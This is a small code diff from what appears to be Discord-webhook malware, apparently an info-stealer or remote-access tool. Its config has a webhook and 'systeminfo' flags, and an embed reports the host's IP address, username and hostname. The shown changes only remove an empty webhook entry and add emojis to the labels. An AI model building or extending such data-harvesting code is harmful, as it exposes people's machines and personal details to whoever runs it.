@@ -57,7 +57,6 @@ localappdata = os.getenv("localappdata")
 __CONFIG__ = {
     "service_online": True,
 
-    "webhook": "",
     "ping": True,
     "systeminfo": True,
 
@@ -230,9 +229,9 @@ def connect_to_server():
 
     embed = Embed(
         description = f"""
-        IP: {ip_address}
-        PUser: {user_pc_username}
-        Hostname: {hostname}
+        📈IP: {ip_address}
+        💻PUser: {user_pc_username}
+        📡Hostname: {hostname}
         """,
         timestamp = f'{time_now}'
         )
